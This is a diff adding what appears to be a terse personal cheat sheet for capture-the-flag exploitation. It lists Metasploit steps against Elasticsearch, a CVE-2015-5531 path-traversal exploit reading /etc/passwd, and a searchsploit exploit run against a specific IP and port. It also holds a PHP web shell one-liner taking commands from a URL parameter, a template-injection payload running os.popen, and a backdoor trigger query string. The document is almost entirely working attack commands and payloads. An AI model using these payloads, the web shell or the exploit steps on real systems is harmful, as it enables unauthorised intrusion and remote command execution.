@@ -1,0 +1,51 @@
+msfconsole
+search elasticsearch
+use 3
+info
+set rhosts (ip)
+set rport (port)
+info
+run
+cat da file
+amoagdebs sadac shenaxulia
+
+python file url /etc/passwd
+
+https://github.com/nixawk/labs/blob/master/CVE-2015-5531/exploit.py
+
+---------------------------------------------------
+nmap -sV -sV -p URL -Pn
+searchsploit lib
+searchsploit -m linux/remote/46307.py 
+python3 46307.py 35.198.135.192 30485  "cd ..; cat flag.txt"
+python   file ip -p port -c  "cd ..; cat flag.txt"
+
+https://gist.github.com/mgeeky/a7271536b1d815acfb8060fd8b65bd5d
+
+---------------------------------------------------------
+<?php echo system($_GET['cmd']);?>
+cat /flag.txt
+-------------------------------------------------------
+curl -I
+name=
+<%
+import os
+x=os.popen('cat flag').read()
+%>
+${x}
+
+-----------------------------------------------
+pho unit
+dirsearch -u 
+
+<?php system('cat /flag.txt')?>
+-------------------------------------------------
+dirsearch -u
+cd Desktop
+wget backup.zip
+extract backup file
+cd backup
+grep -r "shell_exec("
+?welldone=knockknock&shazam=id
+                             cat /flag.php
+
